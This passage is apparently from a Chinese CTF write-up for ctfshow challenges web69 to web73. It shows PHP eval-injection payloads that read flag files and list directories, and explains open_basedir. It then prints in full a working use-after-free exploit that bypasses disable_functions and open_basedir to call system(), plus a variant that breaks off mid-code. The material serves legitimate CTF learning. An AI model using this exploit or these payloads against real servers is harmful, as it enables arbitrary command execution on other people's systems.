+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218994_65a393b2c61eec2b0d086.png"><img src="https://image.3001.net/images/20240114/1705218994_65a393b2c61eec2b0d086.png" alt="image-20231023221340277"></a></p>
+<p>发现这里存在 <code>flag.php</code> 文件。尝试使用 <code>include</code> 配合 <code>php://filter</code> 伪协议进行读取 <code>flag.php</code> 文件的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=include(&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705218999_65a393b7b26b3639e52da.png"><img src="https://image.3001.net/images/20240114/1705218999_65a393b7b26b3639e52da.png" alt="image-20231023221909882"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219004_65a393bcc287ac60b746b.png"><img src="https://image.3001.net/images/20240114/1705219004_65a393bcc287ac60b746b.png" alt="image-20231023221936191"></a></p>
+<p>接着读取服务器根目录下的文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=foreach (scandir(&#x27;/&#x27;) as $file) &#123;echo $file . &quot;&lt;br/&gt;&quot;;&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219009_65a393c1dadf0c9862ef0.png"><img src="https://image.3001.net/images/20240114/1705219009_65a393c1dadf0c9862ef0.png" alt="image-20231023222018616"></a></p>
+<p>发现存在 <code>flag.txt</code>。</p>
+<p><strong>其实这里还可以使用 <code>var_export</code></strong></p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=include_once(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require(&#x27;/flag.txt&#x27;);</span><br><span class="line">c=require_once(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>这里说一下，<code>include</code> 和 <code>require</code> 其实不是函数，而是 PHP 的语句。因此 PHP 是无法禁用该语句的。</p>
+<h2 id="web70-函数禁用-7"><a href="#web70-函数禁用-7" class="headerlink" title="web70 函数禁用 - 7"></a>web70 函数禁用 - 7</h2><p>访问页面，如下：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219018_65a393ca290db69d6f040.png"><img src="https://image.3001.net/images/20240114/1705219018_65a393ca290db69d6f040.png" alt="image-20231023222617310"></a></p>
+<p>按照上一题的代码，本题应该也是传入参数 c，这里我们先进行个目录列出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=foreach (scandir(&#x27;/&#x27;) as $file) &#123;echo $file . &quot;&lt;br/&gt;&quot;;&#125;;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219023_65a393cfe382ca6af0d32.png"><img src="https://image.3001.net/images/20240114/1705219023_65a393cfe382ca6af0d32.png" alt="image-20231023222759104"></a></p>
+<p>当然这里也可以使用 <strong>PHP 的内置类 DirectoryIterator</strong> 进行目录的列出：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219029_65a393d504ce853cc16ab.png"><img src="https://image.3001.net/images/20240114/1705219029_65a393d504ce853cc16ab.png" alt="image-20231023223355697"></a></p>
+<p>PAYLOAD 同上一关。</p>
+<h2 id="web71-函数禁用-8"><a href="#web71-函数禁用-8" class="headerlink" title="web71 函数禁用 - 8"></a>web71 函数禁用 - 8</h2><p>访问网站出现如下页面：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219033_65a393d9a70462d4e2a5e.png"><img src="https://image.3001.net/images/20240114/1705219033_65a393d9a70462d4e2a5e.png" alt="image-20231024082004623"></a></p>
+<p>可以通过附件地址下载网页的源码，源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里出现了陌生的函数 <code>ob_get_contents</code> 和 <code>ob_end_clean();</code>，我们查官方文档可知：</p>
+<p><strong>ob_get_contents</strong></p>
+<p>返回输出缓冲区的内容</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>该函数没有参数</td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>ob_end_clean</strong></p>
+<p>清理（擦除）输出缓冲区并关闭输出缓冲</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>该函数没有参数</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>那么，这里我们大概知道了，当我们传入 &#96;&#96; 的时候，由于会先执行 <code>ob_get_contents</code> 函数，这里会将缓冲区（待输出）的内容赋值给了 <code>$s</code> 变量，接着执行 <code>ob_end_clean</code> 清空一切待打印输出的内容。因此在该函数之前缓冲区中没有任何需要打印的内容了。</p>
+<p>由于将缓冲区的内容提前赋值给了 <code>$s</code> 变量，所以这里他又使用 <code>preg_replace</code> 函数匹配 字母、数字 将其替换为 <code>?</code>。因此传入如下 PAYLOAD，网页会显示如下内容：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219038_65a393de37d2a50b8e2bf.png"><img src="https://image.3001.net/images/20240114/1705219038_65a393de37d2a50b8e2bf.png" alt="image-20231024085101009"></a></p>
+<p>对字母和数字都替换为了问号。</p>
+<p>由于我们传入的内容，作为了 <code>eval</code> 函数的参数，因此我们可以在 原本 PAYLOAD 的结尾加上 <code>exit()</code> 表示退出程序，<code>ob_get_contents</code> 和 之后的代码都不会执行到。</p>
+<p>PAYLOAD：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit();</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219042_65a393e25eaadb9813b88.png"><img src="https://image.3001.net/images/20240114/1705219042_65a393e25eaadb9813b88.png" alt="image-20231024085307454"></a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);exit();</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219046_65a393e60050a0aa1ccd7.png"><img src="https://image.3001.net/images/20240114/1705219046_65a393e60050a0aa1ccd7.png" alt="image-20231024085349293"></a></p>
+<h2 id="web72-函数禁用-9"><a href="#web72-函数禁用-9" class="headerlink" title="web72 函数禁用 - 9"></a>web72 函数禁用 - 9</h2><p>附件源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试使用上一题的 PAYLOAD 进行列出目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=var_export(scandir(&quot;/&quot;));exit();</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219051_65a393eb41b27730d8751.png"><img src="https://image.3001.net/images/20240114/1705219051_65a393eb41b27730d8751.png" alt="image-20231024112419347"></a></p>
+<p>发现这里有 <code>open_basedir</code> 的限制，因此这里无法列出根目录下的内容，不过这里可以使用 PHP 的内置类 <code>DirectoryIterator</code> 进行列出。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;;exit();</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219057_65a393f1143d3b2aebccc.png"><img src="https://image.3001.net/images/20240114/1705219057_65a393f1143d3b2aebccc.png" alt="image-20231024112641431"></a></p>
+<p>尝试使用 <code>include</code> 去引入根目录下的 <code>flag0.txt</code> 文件的内容，但是由于存在 <code>open_basedir</code> 的限制，故而不能使用该方法。</p>
+<p><strong>open_basedir 的作用：</strong></p>
+<p><code>open_basedir</code> 可将用户访问文件的活动范围限制在指定的区域，通常是其家目录的路径，也可用符号<code>.</code> 来代表当前目录。注意用 <code>open_basedir</code> 指定的限制实际上是前缀，而不是目录名。</p>
+<p>举例来说:</p>
+<p>若 <code>open_basedir = /var/www/html</code>, 那么目录 <code>/var/www/html</code> 和 <code>/var/www/html666</code> 都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。例如设置成: <code>open_basedir = /var/www/html/</code>，这个就表示 只能访问 <code>/var/www/html/</code> 目录下的内容。</p>
+<p><code>open_basedir</code> 也可以同时设置多个目录，在 Windows 中用<strong>分号</strong>分隔目录，在任何其它系统中用<strong>冒号</strong>分隔目录。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219063_65a393f75f54130a66de9.png"><img src="https://image.3001.net/images/20240114/1705219063_65a393f75f54130a66de9.png" alt="image-20231024114358634"></a></p>
+<p>这里需要使用 <strong>UFA</strong> 绕过 <code>open_basedir</code>，PAYLOAD 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">function ctfshow($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace();</span><br><span class="line">            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123;</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123;</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function trigger_uaf($arg) &#123;</span><br><span class="line"></span><br><span class="line">        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = 10; </span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(&#x27;x&#x27;);</span><br><span class="line">    $abc = $backtrace[1][&#x27;args&#x27;][0];</span><br><span class="line"></span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"></span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"></span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); </span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); </span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();</span><br></pre></td></tr></table></figure>
+
+<p>我们将其进行 URL 编码之后 传给服务器，即可得到 FLAG：</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219072_65a39400902d43126dcec.png"><img src="https://image.3001.net/images/20240114/1705219072_65a39400902d43126dcec.png" alt="image-20231024161141168"></a></p>
+<h2 id="web73-函数禁用-10"><a href="#web73-函数禁用-10" class="headerlink" title="web73 函数禁用 - 10"></a>web73 函数禁用 - 10</h2><p>源码同上，这里使用上一题的 PAYLOAD 进行做题，由于禁用了 <code>strlen</code> 函数，然而 PYALOAD 中使用了 <code>strlen</code> 函数，故而报错。</p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219075_65a394038ed8702878143.png"><img src="https://image.3001.net/images/20240114/1705219075_65a394038ed8702878143.png" alt="image-20231024162023362"></a></p>
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219361_65a39521837370c838215.png"><img src="https://image.3001.net/images/20240114/1705219361_65a39521837370c838215.png" alt="image-20231024161749956"></a></p>
+<p>先列出根目录下的内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;;exit();</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219083_65a3940b8d85714992c85.png"><img src="https://image.3001.net/images/20240114/1705219083_65a3940b8d85714992c85.png" alt="image-20231024162229060"></a></p>
+<p>发现根目录存在 <code>flagc.txt</code> 文件。</p>
+<p>这里直接尝试使用 <code>include</code> 读取函数读取：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit();</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://image.3001.net/images/20240114/1705219090_65a39412e4228b95fc5a2.png"><img src="https://image.3001.net/images/20240114/1705219090_65a39412e4228b95fc5a2.png" alt="image-20231024164221545"></a></p>
+<p>我们上一题 PAYLOAD 不能使用的原因是，服务器禁用了我们使用 <code>strlen</code> 函数，因此这里我们只需要重写 <code>strlen</code> 函数的功能即可，修改后的源码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php</span><br><span class="line"></span><br><span class="line">function ctfshow($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace();</span><br><span class="line">            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123;</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">function strlen_user($s)</span><br><span class="line">&#123;</span><br><span class="line">  $ret=0;</span><br><span class="line">  for($i=0;$i&lt;1000000;$i++)</span><br><span class="line"> &#123;</span><br><span class="line">    if($s[$i])</span><br><span class="line">    &#123;</span><br><span class="line">      $ret=$ret+1;</span><br><span class="line">    &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    break;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">  return $ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen_user($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"></span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"></span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; </span><br><span class="line"></span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; </span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                </span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"></span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123;</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"></span><br><span class="line">            if($f_name == 0x6d6574737973) &#123;</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    